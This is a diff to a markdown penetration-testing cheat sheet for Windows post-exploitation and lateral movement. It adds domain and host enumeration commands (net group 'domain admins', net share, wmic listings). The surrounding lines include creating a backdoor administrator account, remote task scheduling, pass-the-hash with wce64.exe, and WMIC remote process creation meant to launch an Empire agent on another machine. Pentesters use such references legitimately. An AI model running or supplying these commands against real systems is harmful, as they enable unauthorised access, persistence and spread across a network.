@@ -51,7 +51,12 @@ exploit
 net localgroup Users  
 net localgroup Administrators  
 net user sservice p@ssw0rd /add  
-net localgroup administrators sservice /add 
+net localgroup administrators sservice /add  
+net use  
+net share  
+net group "domain admins" /domain  
+net config workstation  
+net view
   
 ## Schtask
 AT \\REMOTECOMPUTERNAME 12:34 "command to run"  
@@ -102,8 +107,14 @@ wce64.exe -s <username>:<domain>:<lmhash>:<nthash>
 
 
 ## WMIC
+wmic useraccount list  
 wmic useraccount list /format:list  
+wmic services get name,displayname,pathname,startmode  
+wmic startup list brief  
+wmic share list  
 wmic group list brief  
+wmic process list brief  
+wmic product get Name, Vendor  
 wmic path win32_process call create "calc.exe"  
 wmic /node:computername /user:domainname\username path win32_process call create "**empire launcher string here**"  
 wmic /node:192.168.255.10 /user:"secplayground\john" path win32_process call create "calc.exe"  
@@ -148,3 +159,4 @@ powershell "get-adgroup -filter {GroupCategory -eq 'Security' -AND Name -like '*
 - https://www.slideshare.net/votadlos/hunting-lateral-movement-in-windows-infrastructure  
 - https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#net-user-domain  
 - https://github.com/kmkz/Pentesting/blob/master/Pentest-cheat-sheet  
+- https://www.slideshare.net/chrisgates/adversarial-simulation-nickersongates-wild-west-hacking-fest-oct-2017-81444587?qid=f71aedc6-c352-4154-bc51-3faefd5fc0ac&v=&b=&from_search=1
